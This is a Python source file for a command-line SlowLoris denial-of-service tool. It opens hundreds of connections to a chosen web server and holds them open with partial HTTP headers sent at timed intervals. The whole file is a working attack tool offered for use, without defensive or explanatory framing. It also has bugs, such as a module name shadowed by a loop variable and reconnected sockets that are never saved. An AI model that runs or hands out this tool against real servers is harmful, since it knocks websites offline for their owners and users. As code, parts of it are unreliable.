import argparse
from threading import Thread
import socket
import random
import time

# Parse command line arguments
parser = argparse.ArgumentParser(description = "A simple SlowLoris DoS attack tool")
parser.add_argument("-t", "--target", type = str, help = "Attack target hostname/IP address", required = True)
parser.add_argument("-p", "--port", type = int, default = 80, help = "Target port number. Default http port is 80")
parser.add_argument("-s", "--sockets", type = int, default = 200, help = "Number of connections to set up. Default is 200")
parser.add_argument("-i", "--interval", type = int, default = 10, help = "Time the tool waits between sending data to keep the connection alive. Default is 10 seconds")
args = parser.parse_args()

# Parsed input
target_host = args.target
target_port = args.port
num_of_sockets = args.sockets
wait_time = args.interval

# List of active connections
connections = list()

# Initiate a TCP connection with the targeted host on the specified port number and start
# sending the incomplete http header.
# Args: host - Target hostname/ip address
#       port - Target port number
# Returns: s - The connection socket, None if initiation failed
def initiate_connection(host, port):
    s = None
    for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
        af, socktype, proto, canonname, sa = res
        try:
            s = socket.socket(af, socktype, proto)
        except socket.error as msg:
            print "initiate_connection(): " + msg
            s = None
            continue
        try:
            s.settimeout(5)
            s.connect(sa)
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1993)).encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en\r\n".encode("utf-8"))
        except socket.error as msg:
            print "initiate_connection(): " + msg
            s.close()
            s = None
            continue
        break
    if s is None:
        print "Could not open socket"
    return s

# Keep an established connection alive by sending the next part of the incomplete http header (gibberish).
# If the connection has been ended by the server, initiate a new one.
# Args: s - Connection socket
def keep_connection_alive(socket):
    success = False
    try:
        socket.send("X-a: loris{}\r\n".format(random.randint(1, 1337)).encode("utf-8"))
        success = True
    except socket.error as msg:
        print "keep_connection_alive(): " + msg
    
    if success == False:
        print "Connection " + str(connections.index(socket)) + " died. Reconnecting..."
        socket = initiate_connection(target_host, target_port)
        
def main():
    # Init connections
    print "\nSetting up connections...\n"
    for i in range(num_of_sockets):
        socket = initiate_connection(target_host, target_port)
        connections.append(socket)
        print "Set up connection " + str(i)
    print "\nSuccessfully set up " + str(len(connections)) + " connection(s)\n"
    
    # Keep connections alive
    while True:
        print "Keeping connections alive..."
        for socket in connections:
            thread = Thread(target = keep_connection_alive, args = (socket,))
            thread.daemon = True
            thread.start()
        print str(len(connections)) + " active connection(s)."

        # Wait until next sending round
        time.sleep(wait_time)

if __name__ == "__main__":
    main()